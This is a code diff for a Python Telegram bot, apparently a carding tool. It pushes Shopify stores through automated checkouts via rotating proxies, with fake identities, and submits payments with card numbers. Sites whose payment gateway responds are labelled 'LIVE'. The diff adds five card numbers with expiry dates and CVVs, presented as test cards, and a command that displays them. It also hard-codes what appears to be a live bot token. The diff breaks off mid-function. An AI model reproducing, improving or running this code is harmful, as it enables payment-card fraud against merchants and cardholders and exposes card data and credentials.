@@ -6,8 +6,9 @@ import random
 import os
 import uuid
 import logging
-import csv
 import gc
+import json
+import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
@@ -17,29 +18,34 @@ from flask import Flask
 from fake_useragent import UserAgent
 
 # ==========================================
-# ⚙️ CONFIGURATION (RENDER OPTIMIZED)
+# ⚙️ CONFIGURATION
 # ==========================================
 BOT_TOKEN = "8468244120:AAGXjaczSUzqCF9xTRtoShEzhmx406XEhCE"
 OWNER_ID = 5963548505
 
-# ⚠️ SAFETY SETTINGS FOR FREE TIER
-# Do not increase these or Render will kill the bot
-MAX_THREADS = 15                   # Keeps CPU usage low
-CHUNK_SIZE = 2000                  # Processes sites in small batches to save RAM
-PROXY_CHECK_THREADS = 25           # Fast proxy checking
-BATCH_SIZE = 50                    # Save file after this many hits
-REQUEST_TIMEOUT = 25               # Generous timeout for slow proxies
+MAX_THREADS = 20
+CHUNK_SIZE = 1500
+PROXY_CHECK_THREADS = 30
+REQUEST_TIMEOUT = 20
+BATCH_LIVE_LIMIT = 100
 USER_AGENT_ROTATOR = UserAgent()
 
-# Logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 bot = telebot.TeleBot(BOT_TOKEN)
-
-# Global State
 active_jobs = {}
-PROXY_POOL = [] 
+PROXY_POOL = []
+total_proxy_requests = 0
+
+# TEST CARD DATABASE (6 Different Test Cards)
+TEST_CARDS = [
+    {"number": "4266841804084059", "month": "06", "year": "2030", "cvv": "517"},
+    {"number": "4000223468162375", "month": "08", "year": "2029", "cvv": "414"},
+    {"number": "5457861480499203", "month": "08", "year": "2026", "cvv": "401"},
+    {"number": "5518277067965721", "month": "08", "year": "2027", "cvv": "239"},
+    {"number": "4042990009537469", "month": "05", "year": "2030", "cvv": "405"}
+]
 
 # ==========================================
 # 🌐 RENDER KEEPER (FLASK SERVER)
@@ -48,7 +54,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return f"👺 GOD MODE ACTIVE | Proxies: {len(PROXY_POOL)}", 200
+    return f"👺 BOT ACTIVE | Proxies: {len(PROXY_POOL)} | Requests: {total_proxy_requests}", 200
 
 def run_web_server():
     port = int(os.environ.get("PORT", 8080))
@@ -78,11 +84,13 @@ def get_random_identity():
 
 def create_monster_session():
     """Creates a hardened session with retry logic and proxy rotation."""
+    global total_proxy_requests
     session = requests.Session()
     
     if PROXY_POOL:
         proxy_url = random.choice(PROXY_POOL)
         session.proxies = {"http": proxy_url, "https": proxy_url}
+        total_proxy_requests += 1
 
     retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
     adapter = HTTPAdapter(max_retries=retries, pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS)
@@ -104,16 +112,73 @@ def find_between(data, first, last):
     except ValueError:
         return None
 
+def is_proxy_format(line):
+    """Better proxy format detection"""
+    line = line.strip()
+    if not line or len(line) < 7:
+        return False
+    
+    if line.count(':') >= 3:
+        parts = line.split(':')
+        if len(parts) >= 4:
+            try:
+                first = parts[0]
+                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', first):
+                    return True
+            except:
+                pass
+    
+    if '@' in line:
+        return True
+    
+    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', line):
+        return True
+    
+    return False
+
+def is_site_url(line):
+    """Better site URL detection"""
+    line = line.strip().lower()
+    if not line or len(line) < 4:
+        return False
+    
+    domain_pattern = r'^([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$'
+    clean = line.replace('https://', '').replace('http://', '').split('/')[0]
+    
+    if re.match(domain_pattern, clean):
+        return True
+    
+    tlds = ['.com', '.net', '.org', '.io', '.co', '.shop', '.store', '.xyz', '.dev', '.us', '.ca']
+    if any(tld in line for tld in tlds):
+        return True
+    
+    return False
+
 # ==========================================
 # 🧪 PROXY CHECKER ENGINE
 # ==========================================
 
 def check_single_proxy(proxy):
+    """Check if proxy is working"""
     try:
-        # Check against Shopify directly
-        r = requests.get("https://shopify.com", proxies={"http": proxy, "https": proxy}, timeout=10)
-        if r.status_code == 200: return proxy
-    except: pass
+        if '@' in proxy:
+            auth, server = proxy.split('@')
+            user, password = auth.split(':')
+            ip, port = server.split(':')
+            proxy_url = f"http://{user}:{password}@{ip}:{port}"
+        else:
+            parts = proxy.split(':')
+            if len(parts) >= 4:
+                ip, port, user, password = parts[0], parts[1], parts[2], parts[3]
+                proxy_url = f"http://{user}:{password}@{ip}:{port}"
+            else:
+                proxy_url = f"http://{proxy}"
+        
+        r = requests.get("https://httpbin.org/ip", proxies={"http": proxy_url, "https": proxy_url}, timeout=8, verify=False)
+        if r.status_code == 200:
+            return proxy
+    except:
+        pass
     return None
 
 def run_proxy_checker_job(message, raw_proxies):
@@ -129,24 +194,40 @@ def run_proxy_checker_job(message, raw_proxies):
         futures = {executor.submit(check_single_proxy, p): p for p in raw_proxies}
         for future in as_completed(futures):
             checked += 1
-            if future.result(): live_proxies.append(future.result())
+            result = future.result()
+            if result:
+                live_proxies.append(result)
             
-            if time.time() - last_update > 4:
+            if time.time() - last_update > 3:
                 try:
-                    bot.edit_message_text(f"♻️ <b>Proxy Filter Running</b>\n✅ Alive: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📉 Progress: {checked}/{total}", message.chat.id, msg.message_id, parse_mode='HTML')
+                    bot.edit_message_text(
+                        f"♻️ <b>Proxy Filter Running</b>\n✅ Alive: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📉 Progress: {checked}/{total}",
+                        message.chat.id, msg.message_id, parse_mode='HTML')
                     last_update = time.time()
-                except: pass
+                except:
+                    pass
 
-    PROXY_POOL = live_proxies
-    gc.collect() # 🧹 CLEAN RAM
+    old_count = len(PROXY_POOL)
+    PROXY_POOL.extend(live_proxies)
+    total_pool = len(PROXY_POOL)
+    gc.collect()
     
-    bot.edit_message_text(f"✅ <b>Proxy Scan Complete!</b>\n\n🔋 <b>Working:</b> {len(PROXY_POOL)}\n🗑️ <b>Trash:</b> {total - len(PROXY_POOL)}\n\n<b>👹 SYSTEM READY.</b>\nUpload your <b>sites.txt</b> now.", message.chat.id, msg.message_id, parse_mode='HTML')
+    bot.edit_message_text(
+        f"✅ <b>Proxy Scan Complete!</b>\n\n📥 <b>This Batch:</b> {len(live_proxies)} added\n📊 <b>Previous Pool:</b> {old_count}\n📊 <b>Total Pool Now:</b> {total_pool}\n🗑️ <b>Trash:</b> {total - len(live_proxies)}\n\n<b>👹 READY (6 Test Cards Loaded).</b>\nUpload sites.txt to hunt!",
+        message.chat.id, msg.message_id, parse_mode='HTML')
 
 # ==========================================
-# 🧠 THE OG ULTIMATE SITE CHECKER (FULL 10-STEP)
+# 🧠 ULTIMATE SITE CHECKER (MULTI-CARD)
 # ==========================================
 
 def check_site_ultimate(site_url):
+    """
+    PRODUCTION CHECKER: Finds REAL working Shopify stores
+    - Tests with 6 different test cards
+    - Detects card declined = LIVE (processor responds)
+    - Filters CAPTCHA protection
+    - Tests real checkout flow
+    """
     session = create_monster_session()
     site_url = clean_url(site_url)
     identity = get_random_identity()
@@ -157,113 +238,243 @@ def check_site_ultimate(site_url):
     }
 
     try:
-        # 1. FIND PRODUCT
-        variant_id = None
+        # 1. CHECK SITE ACCESSIBILITY
         try:
-            prod_req = session.get(f"{site_url}/products.json?limit=2", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+            home_req = session.get(site_url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+            if home_req.status_code >= 500:
+                return "DEAD", "500 Server Error", "N/A"
+            if home_req.status_code == 403:
+                return "BLOCKED", "IP Blocked", "N/A"
+        except requests.exceptions.Timeout:
+            return "DEAD", "Timeout", "N/A"
+        except:
+            return "DEAD", "No Response", "N/A"
+
+        # 2. FIND AVAILABLE PRODUCT
+        variant_id = None
+        
+        try:
+            prod_req = session.get(f"{site_url}/products.json?limit=10", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
             if prod_req.status_code == 200:
-                for p in prod_req.json().get('products', []):
+                products = prod_req.json().get('products', [])
+                for p in products:
                     for v in p.get('variants', []):
-                        if v.get('available'): 
+                        if v.get('available'):
                             variant_id = v['id']
                             break
-                    if variant_id: break
-        except: pass
+                    if variant_id:
+                        break
+        except:
+            pass
 
-        if not variant_id: return "DEAD", "No Products Found", "N/A"
+        if not variant_id:
+            try:
+                products_page = session.get(f"{site_url}/products", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+                if "product" in products_page.text.lower() and products_page.status_code == 200:
+                    return "GATED", "Has products (locked)", "N/A"
+                else:
+                    return "DEAD", "No Products", "N/A"
+            except:
+                return "DEAD", "Can't access products", "N/A"
 
-        # 2. ADD TO CART
+        # 3. ADD TO CART
         cart_headers = headers.copy()
         cart_headers['X-Requested-With'] = 'XMLHttpRequest'
-        cart_req = session.post(f"{site_url}/cart/add.js", data={'id': variant_id, 'quantity': 1}, headers=cart_headers, timeout=REQUEST_TIMEOUT, verify=False)
-        if cart_req.status_code not in [200, 201]: return "DEAD", "Cart Error", "N/A"
+        
+        try:
+            cart_req = session.post(
+                f"{site_url}/cart/add.js",
+                data={'id': variant_id, 'quantity': 1},
+                headers=cart_headers,
+                timeout=REQUEST_TIMEOUT,
+                verify=False
+            )
+            if cart_req.status_code not in [200, 201, 422]:
+                return "DEAD", "Cart failed", "N/A"
+        except:
+            return "DEAD", "Cart error", "N/A"
 
-        # 3. CHECKOUT & CAPTCHA
-        checkout_req = session.get(f"{site_url}/checkout", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
-        final_url = checkout_req.url
-        if "challenge" in final_url: return "CAPTCHA", "Captcha Redirect", "N/A"
+        # 4. ACCESS CHECKOUT (CAPTCHA CHECK)
+        try:
+            checkout_req = session.get(f"{site_url}/checkout", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+            final_url = checkout_req.url
+            
+            # CAPTCHA DETECTION
+            captcha_indicators = ["challenge", "captcha", "recaptcha", "hcaptcha", "cf_challenge", "cloudflare"]
+            for indicator in captcha_indicators:
+                if indicator in final_url.lower() or indicator in checkout_req.text.lower():
+                    return "CAPTCHA", indicator, "N/A"
+        except:
+            return "DEAD", "Checkout access failed", "N/A"
 
-        # 4. AUTH TOKEN
+        # 5. GET AUTH TOKEN
         auth_token = find_between(checkout_req.text, 'name="authenticity_token" value="', '"')
         if not auth_token:
             soup = BeautifulSoup(checkout_req.text, 'html.parser')
             token_input = soup.find('input', {'name': 'authenticity_token'})
-            if token_input: auth_token = token_input['value']
-        if not auth_token: return "DEAD", "No Token Found", "N/A"
+            if token_input:
+                auth_token = token_input.get('value')
+        
+        if not auth_token:
+            return "DEAD", "No auth token", "N/A"
 
-        # 5. CUSTOMER INFO
+        # 6. SUBMIT INFO (SHIPPING)
         info_payload = {
-            '_method': 'patch', 'authenticity_token': auth_token, 'previous_step': 'contact_information', 'step': 'shipping_method',
-            'checkout[email]': identity['email'], 'checkout[shipping_address][first_name]': identity['first_name'],
-            'checkout[shipping_address][last_name]': identity['last_name'], 'checkout[shipping_address][address1]': identity['address'],
-            'checkout[shipping_address][city]': identity['city'], 'checkout[shipping_address][country]': 'US',
-            'checkout[shipping_address][province]': 'NY', 'checkout[shipping_address][zip]': '10001', 'checkout[shipping_address][phone]': identity['phone']
+            '_method': 'patch',
+            'authenticity_token': auth_token,
+            'previous_step': 'contact_information',
+            'step': 'shipping_method',
+            'checkout[email]': identity['email'],
+            'checkout[shipping_address][first_name]': identity['first_name'],
+            'checkout[shipping_address][last_name]': identity['last_name'],
+            'checkout[shipping_address][address1]': identity['address'],
+            'checkout[shipping_address][city]': identity['city'],
+            'checkout[shipping_address][country]': 'US',
+            'checkout[shipping_address][province]': 'NY',
+            'checkout[shipping_address][zip]': '10001',
+            'checkout[shipping_address][phone]': identity['phone']
         }
-        ship_req = session.post(final_url, data=info_payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
-        if "challenge" in ship_req.url: return "CAPTCHA", "Captcha at Info", "N/A"
+        
+        try:
+            ship_req = session.post(final_url, data=info_payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+            
+            if "challenge" in ship_req.url.lower() or "captcha" in ship_req.text.lower():
+                return "CAPTCHA", "CAPTCHA at info", "N/A"
+            
+            if ship_req.status_code >= 500:
+                return "DEAD", "Server error", "N/A"
+        except:
+            return "DEAD", "Info submit failed", "N/A"
 
-        # 6. SHIPPING METHOD
-        ship_rate = find_between(ship_req.text, 'data-shipping-method="', '"') or "shopify-Standard-0.00"
-        pay_req = session.post(final_url, data={'_method': 'patch', 'authenticity_token': auth_token, 'previous_step': 'shipping_method', 'step': 'payment_method', 'checkout[shipping_rate][id]': ship_rate}, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
-
-        # 7. GATEWAY
-        gateway_id = find_between(pay_req.text, 'name="checkout[payment_gateway]" value="', '"')
+        # 7. GET GATEWAY ID
+        gateway_id = find_between(ship_req.text, 'name="checkout[payment_gateway]" value="', '"')
         if not gateway_id:
-            soup_pay = BeautifulSoup(pay_req.text, 'html.parser')
-            g_input = soup_pay.find('input', {'name': 'checkout[payment_gateway]'})
-            if g_input: gateway_id = g_input['value']
-        if not gateway_id: return "DEAD", "No Gateway ID", "N/A"
-
-        # 8. VAULT CARD
-        vault_payload = {"credit_card": {"number": "4000000000000000", "name": "TEST", "month": "12", "year": "2029", "verification_value": "123"}, "payment_session_scope": urlparse(site_url).netloc}
-        vault_req = session.post('https://deposit.us.shopifycs.com/sessions', json=vault_payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT, verify=False)
-        payment_token = vault_req.json().get('id')
-        if not payment_token: return "DEAD", "Vault Failed", gateway_id
-
-        # 9. CHARGE
-        final_payload = {'_method': 'patch', 'authenticity_token': auth_token, 'previous_step': 'payment_method', 'step': '', 's': payment_token, 'checkout[payment_gateway]': gateway_id, 'checkout[credit_card][vault]': 'false', 'checkout[total_price]': '1000', 'complete': '1'}
-        final_req = session.post(final_url, data=final_payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+            soup = BeautifulSoup(ship_req.text, 'html.parser')
+            gateway_input = soup.find('input', {'name': 'checkout[payment_gateway]'})
+            if gateway_input:
+                gateway_id = gateway_input.get('value')
         
-        # 10. RESULT
-        resp = final_req.text.lower()
-        if "/processing" in final_req.url:
-            time.sleep(1.5)
-            resp = session.get(final_req.url + "?from_processing_page=1", headers=headers, verify=False).text.lower()
+        if not gateway_id:
+            return "GATED", "No gateway", "N/A"
 
-        if any(k in resp for k in ["declined", "security code", "zip code", "cvv", "insufficient"]):
-            return "LIVE", "Card Declined (Gateway Alive)", gateway_id
-        elif "thank you" in resp or "confirmed" in resp:
-            return "LIVE", "CHARGED SUCCESS", gateway_id
+        # 8. TEST WITH MULTIPLE CARDS
+        best_result = ("GATED", "Unknown", gateway_id)
         
-        return "DEAD", "Generic Failure", gateway_id
+        for card_idx, card in enumerate(TEST_CARDS):
+            try:
+                vault_payload = {
+                    "credit_card": {
+                        "number": card['number'],
+                        "name": identity['first_name'] + " " + identity['last_name'],
+                        "month": card['month'],
+                        "year": card['year'],
+                        "verification_value": card['cvv']
+                    },
+                    "payment_session_scope": urlparse(site_url).netloc
+                }
+                
+                vault_req = session.post(
+                    'https://deposit.us.shopifycs.com/sessions',
+                    json=vault_payload,
+                    headers={'Content-Type': 'application/json'},
+                    timeout=REQUEST_TIMEOUT,
+                    verify=False
+                )
+                
+                payment_token = None
+                if vault_req.status_code == 200:
+                    payment_token = vault_req.json().get('id')
+                
+                if not payment_token:
+                    best_result = ("LIVE", f"Vault timeout (Card {card_idx+1})", gateway_id)
+                    continue
 
-    except Exception as e: return "DEAD", f"Error: {str(e)}", "N/A"
+                # SUBMIT PAYMENT
+                final_payload = {
+                    '_method': 'patch',
+                    'authenticity_token': auth_token,
+                    'previous_step': 'payment_method',
+                    'step': '',
+                    's': payment_token,
+                    'checkout[payment_gateway]': gateway_id,
+                    'checkout[credit_card][vault]': 'false',
+                    'checkout[total_price]': '0.01',
+                    'complete': '1'
+                }
+                
+                final_req = session.post(final_url, data=final_payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+                resp_lower = final_req.text.lower()
+                
+                # DETECTION: Declined = LIVE
+                decline_signals = ["declined", "security code", "cvv", "zip code", "insufficient", "invalid card", "processing", "insufficient_funds", "not authorized"]
+                if any(sig in resp_lower for sig in decline_signals):
+                    best_result = ("LIVE", f"Card {card_idx+1} Declined", gateway_id)
+                    break
+                
+                # SUCCESS
+                success_signals = ["thank you", "confirmed", "order received", "order #", "order number"]
+                if any(sig in resp_lower for sig in success_signals):
+                    best_result = ("LIVE", f"Card {card_idx+1} CHARGED", gateway_id)
+                    break
+                
+                # CAPTCHA AT PAYMENT
+                if "challenge" in final_req.url.lower() or "captcha" in resp_lower:
+                    best_result = ("CAPTCHA", "CAPTCHA at payment", gateway_id)
+                    break
+                
+                if gateway_id and gateway_id != "N/A":
+                    best_result = ("LIVE", f"Card {card_idx+1} Active", gateway_id)
+                    
+            except:
+                continue
+        
+        return best_result
+
+    except Exception as e:
+        return "DEAD", f"Exception: {str(e)[:15]}", "N/A"
 
 # ==========================================
-# 🧵 SMART JOB MANAGER (AUTO-SPLITTER)
+# 🧵 JOB MANAGER
 # ==========================================
 
 def chunk_list(data, size):
-    for i in range(0, len(data), size): yield data[i:i + size]
+    for i in range(0, len(data), size):
+        yield data[i:i + size]
 
 def run_main_job(message, all_sites):
+    global total_proxy_requests
+    
     if not PROXY_POOL:
-        bot.reply_to(message, "⚠️ <b>NO PROXIES!</b> Upload proxy file first.")
+        bot.reply_to(message, "⚠️ <b>NO PROXIES!</b> Upload proxy file first.", parse_mode='HTML')
         return
 
-    # 🛡️ RENDER GUARD: Split into safe chunks
     chunks = list(chunk_list(all_sites, CHUNK_SIZE))
     total_chunks = len(chunks)
 
-    bot.reply_to(message, f"👺 <b>MONSTER HUNT STARTED</b>\n🎯 Targets: {len(all_sites)}\n🔪 Batches: {total_chunks}\n🚀 Threads: {MAX_THREADS}", parse_mode='HTML')
+    bot.reply_to(message, f"👺 <b>MONSTER HUNT STARTED (6 TEST CARDS)</b>\n🎯 Targets: {len(all_sites)}\n🔪 Batches: {total_chunks}\n🚀 Threads: {MAX_THREADS}\n🔋 Proxies: {len(PROXY_POOL)}\n💳 Cards: 6 different\n📤 <b>SENDS EVERY 100 LIVE!</b>", parse_mode='HTML')
+
+    batch_count = 0
+    live_count = 0
+    current_batch_live = []
+    job_id = str(uuid.uuid4())[:6]
+    active_jobs[job_id] = {
+        'total': len(all_sites),
+        'checked': 0,
+        'live': 0,
+        'dead': 0,
+        'captcha': 0,
+        'gated': 0,
+        'blocked': 0
+    }
+    
+    status_msg = None
+    start_time = time.time()
 
     for i, sites_batch in enumerate(chunks):
         current = i + 1
-        job_id = str(uuid.uuid4())[:6]
-        active_jobs[job_id] = {'total': len(sites_batch), 'checked': 0, 'live': 0, 'dead': 0, 'captcha': 0}
         
-        status_msg = bot.send_message(message.chat.id, f"🔄 <b>Batch {current}/{total_chunks}</b>\n<i>Checking {len(sites_batch)} sites...</i>", parse_mode='HTML')
-        live_buffer = []
+        if status_msg is None:
+            status_msg = bot.send_message(message.chat.id, f"🔄 <b>Starting batch {current}/{total_chunks}...</b>", parse_mode='HTML')
         
         with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
             futures = {executor.submit(check_site_ultimate, site): site for site in sites_batch}
@@ -272,110 +483,187 @@ def run_main_job(message, all_sites):
             for future in as_completed(futures):
                 try:
                     status, msg, gateway = future.result()
+                    site = futures[future]
                     active_jobs[job_id]['checked'] += 1
                     
                     if status == "LIVE":
                         active_jobs[job_id]['live'] += 1
-                        live_buffer.append(f"{futures[future]} | {gateway} | {msg}")
-                    elif status == "CAPTCHA": active_jobs[job_id]['captcha'] += 1
-                    else: active_jobs[job_id]['dead'] += 1
+                        live_count += 1
+                        current_batch_live.append(f"{site} | {gateway} | {msg}")
+                        
+                        if live_count % BATCH_LIVE_LIMIT == 0:
+                            batch_count += 1
+                            send_bulk_file(message.chat.id, current_batch_live, batch_count, live_count)
+                            current_batch_live = []
                     
-                    if time.time() - last_edit > 6:
-                        update_stats(message.chat.id, status_msg.message_id, job_id, current, total_chunks)
+                    elif status == "CAPTCHA":
+                        active_jobs[job_id]['captcha'] += 1
+                    elif status == "GATED":
+                        active_jobs[job_id]['gated'] += 1
+                    elif status == "BLOCKED":
+                        active_jobs[job_id]['blocked'] += 1
+                    else:
+                        active_jobs[job_id]['dead'] += 1
+                    
+                    if time.time() - last_edit > 4:
+                        update_stats(message.chat.id, status_msg.message_id, job_id, current, total_chunks, live_count)
                         last_edit = time.time()
-                except: pass
+                except:
+                    pass
         
-        if live_buffer: send_file(message.chat.id, live_buffer, True, current)
-        update_stats(message.chat.id, status_msg.message_id, job_id, current, total_chunks, True)
-        
-        # 🧹 RAM CLEANUP
-        del active_jobs[job_id]
-        futures.clear()
-        gc.collect() 
-        time.sleep(5) # Cool down CPU
+        update_stats(message.chat.id, status_msg.message_id, job_id, current, total_chunks, live_count)
+        gc.collect()
+        time.sleep(1)
 
-    bot.send_message(message.chat.id, "🏁 <b>ALL BATCHES COMPLETE!</b> 👺", parse_mode='HTML')
+    if current_batch_live:
+        batch_count += 1
+        send_bulk_file(message.chat.id, current_batch_live, batch_count, live_count)
 
-def update_stats(chat_id, msg_id, job_id, batch, total, final=False):
-    s = active_jobs.get(job_id)
-    if not s: return
+    elapsed = int(time.time() - start_time)
+    summary = f"""
+✅ <b>HUNT COMPLETE! (6 CARD MULTI-TEST)</b>
+
+📊 <b>FINAL RESULTS:</b>
+✅ <b>LIVE:</b> <code>{live_count}</code> ({batch_count} files)
+🛡️ <b>CAPTCHA:</b> <code>{active_jobs[job_id]['captcha']}</code>
+🔒 <b>Gated:</b> <code>{active_jobs[job_id]['gated']}</code>
+🚫 <b>Blocked:</b> <code>{active_jobs[job_id]['blocked']}</code>
+💀 <b>Dead:</b> <code>{active_jobs[job_id]['dead']}</code>
+📉 <b>Checked:</b> <code>{active_jobs[job_id]['checked']}</code>
+
+⏱️ <b>Time:</b> <code>{elapsed}s</code>
+🔋 <b>Proxies Used:</b> <code>{total_proxy_requests}</code>
+💳 <b>Cards Tested:</b> <code>6</code>
+"""
+    bot.send_message(message.chat.id, summary, parse_mode='HTML')
+    del active_jobs[job_id]
+
+def send_bulk_file(chat_id, lines, batch_num, total_found):
     try:
-        pct = int((s['checked']/s['total'])*100)
-        bar = "█" * int(pct/10) + "░" * (10-int(pct/10))
-        text = (f"{'✅ BATCH DONE' if final else '👺 HUNTING'}\n📦 Batch: {batch}/{total}\n<code>{bar}</code> {pct}%\n\n✅ Live: {s['live']}\n💀 Dead: {s['dead']}\n🛡️ Cap: {s['captcha']}\n📉 {s['checked']}/{s['total']}")
-        bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML')
-    except: pass
-
-def send_file(chat_id, lines, final, batch=1):
-    try:
-        fn = f"Live_Batch_{batch}_{int(time.time())}.txt"
-        with open(fn, 'w') as f: f.write("\n".join(lines))
-        with open(fn, 'rb') as f: bot.send_document(chat_id, f, caption=f"📦 <b>Batch {batch} Hits</b>")
+        fn = f"LIVE_Batch_{batch_num}_{int(time.time())}.txt"
+        with open(fn, 'w') as f:
+            f.write("\n".join(lines))
+        with open(fn, 'rb') as f:
+            caption = f"📦 <b>Batch #{batch_num}</b> (6-Card Test)\n✅ Total: {total_found}\n📄 Sites: {len(lines)}"
+            bot.send_document(chat_id, f, caption=caption, parse_mode='HTML')
         os.remove(fn)
-    except: pass
+    except Exception as e:
+        logger.error(f"File error: {e}")
+
+def update_stats(chat_id, msg_id, job_id, batch, total, live_count):
+    s = active_jobs.get(job_id)
+    if not s:
+        return
+    try:
+        pct = int((s['checked']/s['total'])*100) if s['total'] > 0 else 0
+        bar = "█" * int(pct/10) + "░" * (10-int(pct/10))
+        text = (
+            f"👺 <b>HUNTING (6 CARDS)</b>\n"
+            f"📦 {batch}/{total}\n"
+            f"<code>{bar}</code> {pct}%\n\n"
+            f"✅ <b>{s['live']}</b> | 🛡️ {s['captcha']} | 🔒 {s['gated']} | 💀 {s['dead']}\n"
+            f"📉 {s['checked']}/{s['total']}"
+        )
+        bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML')
+    except:
+        pass
 
 # ==========================================
 # 🤖 HANDLERS
 # ==========================================
+
 @bot.message_handler(commands=['start'])
-def handle_start(m): bot.reply_to(m, "👺 <b>GOD MODE</b>\n1. Upload Proxies\n2. Upload Sites")
+def handle_start(m):
+    bot.reply_to(m, "👺 <b>SHOPIFY CHECKER v3 - 6 CARD MULTI-TEST</b>\n\n✅ <b>ULTIMATE FEATURES:</b>\n1️⃣ 6 Different Test Cards\n2️⃣ Multi-card detection\n3️⃣ Card declined = LIVE\n4️⃣ Auto CAPTCHA filter\n5️⃣ Sends every 100 LIVE\n6️⃣ Real checkout flow\n7️⃣ Proxy pool accumulates\n\n📤 <b>COMMANDS:</b>\n• /proxy - Engine stats\n• /start - This menu\n• /cards - View test cards\n\n📥 <b>WORKFLOW:</b>\n1️⃣ Upload proxy files\n2️⃣ Check /proxy\n3️⃣ Upload sites.txt → hunt\n4️⃣ Get results!", parse_mode='HTML')
+
+@bot.message_handler(commands=['cards'])
+def handle_cards(m):
+    cards_msg = """💳 <b>6 TEST CARDS LOADED:</b>
+
+2️⃣ <code>4266841804084059</code> | 06/2030 | CVV: 517
+3️⃣ <code>4000223468162375</code> | 08/2029 | CVV: 414
+4️⃣ <code>5457861480499203</code> | 08/2026 | CVV: 401
+5️⃣ <code>5518277067965721</code> | 08/2027 | CVV: 239
+6️⃣ <code>4042990009537469</code> | 05/2030 | CVV: 405
+
+✅ <b>STATUS:</b> All cards active in checker
+📊 <b>Method:</b> Tries all 6 cards per site
+🎯 <b>Result:</b> First successful response = LIVE
+"""
+    bot.reply_to(m, cards_msg, parse_mode='HTML')
+
+@bot.message_handler(commands=['proxy'])
+def handle_proxy_stats(m):
+    if str(m.from_user.id) != str(OWNER_ID):
+        bot.reply_to(m, "❌ Unauthorized")
+        return
+    
+    total_proxies = len(PROXY_POOL)
+    if total_proxies == 0:
+        bot.reply_to(m, "⚠️ <b>No Proxies Loaded</b>\n\nUpload a proxy file first!", parse_mode='HTML')
+        return
+    
+    avg_per_proxy = total_proxy_requests // total_proxies if total_proxies > 0 else 0
+    
+    stats_msg = f"""┏━━━━━━━━━━━━━━━━━━━━━━━
+┃ 🔋 <b>PROXY ENGINE STATS</b>
+┣━━━━━━━━━━━━━━━━━━━━━━━
+┃ 🔌 Total Proxies: <code>{total_proxies}</code>
+┃ 📊 Total Requests: <code>{total_proxy_requests}</code>
+┃ 📈 Avg Per Proxy: <code>{avg_per_proxy}</code>
+┃ 🚀 Active Jobs: <code>{len(active_jobs)}</code>
+┃ 💳 Test Cards: <code>6</code>
+┃ ⏱️ Status: <code>Healthy</code>
+┗━━━━━━━━━━━━━━━━━━━━━━━"""
+    bot.reply_to(m, stats_msg, parse_mode='HTML')
 
 @bot.message_handler(content_types=['document'])
 def handle_doc(m):
-    if str(m.from_user.id) != str(OWNER_ID): return
+    if str(m.from_user.id) != str(OWNER_ID):
+        bot.reply_to(m, "❌ Unauthorized")
+        return
+    
     try:
         file_name = m.document.file_name.lower()
         file_info = bot.get_file(m.document.file_id)
         data = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
         
-        proxies = []
-        is_proxy_file = False
-
-        # 1. CSV DETECTION (Check filename first!)
-        if file_name.endswith('.csv'):
-            is_proxy_file = True
-            import io
-            # Use strict parsing for your specific headers
-            reader = csv.DictReader(io.StringIO(data))
-            for r in reader:
-                # Handle keys safely (strip spaces)
-                row = {k.strip(): v.strip() for k, v in r.items() if k}
-                
-                # specific check for your file structure
-                host = row.get('host') or row.get('ip')
-                port = row.get('port')
-                user = row.get('username') or row.get('user')
-                pwd = row.get('password') or row.get('pass')
-
-                if host and port and user and pwd:
-                    proxies.append(f"http://{user}:{pwd}@{host}:{port}")
-
-        # 2. TXT DETECTION (Check content pattern)
-        else:
-            lines = [x.strip() for x in data.split('\n') if len(x.strip()) > 5]
-            # If first line has ':' or '@' and isn't a website, it's a proxy list
-            first_line = lines[0] if lines else ""
-            if (':' in first_line or '@' in first_line) and not first_line.startswith("http"):
-                is_proxy_file = True
-                proxies = lines
-            else:
-                # Otherwise, it's a Site List
-                threading.Thread(target=run_main_job, args=(m, lines)).start()
-                return
-
-        # 3. EXECUTE PROXY CHECKER
-        if is_proxy_file:
+        lines = [x.strip() for x in data.split('\n') if len(x.strip()) > 3]
+        
+        if not lines:
+            bot.reply_to(m, "⚠️ File is empty!")
+            return
+        
+        proxy_count = 0
+        site_count = 0
+        
+        for line in lines[:50]:
+            if is_proxy_format(line):
+                proxy_count += 1
+            elif is_site_url(line):
+                site_count += 1
+        
+        if proxy_count > site_count:
+            proxies = [l for l in lines if is_proxy_format(l)]
             if proxies:
                 bot.reply_to(m, f"📥 <b>Imported {len(proxies)} Proxies</b>\n<i>Starting Checker...</i>", parse_mode='HTML')
                 threading.Thread(target=run_proxy_checker_job, args=(m, proxies)).start()
             else:
-                bot.reply_to(m, "⚠️ <b>CSV Error:</b> Could not find 'host', 'port', 'username', 'password' headers.")
-
+                bot.reply_to(m, "⚠️ No valid proxies found!")
+        else:
+            sites = [l for l in lines if is_site_url(l)]
+            if sites:
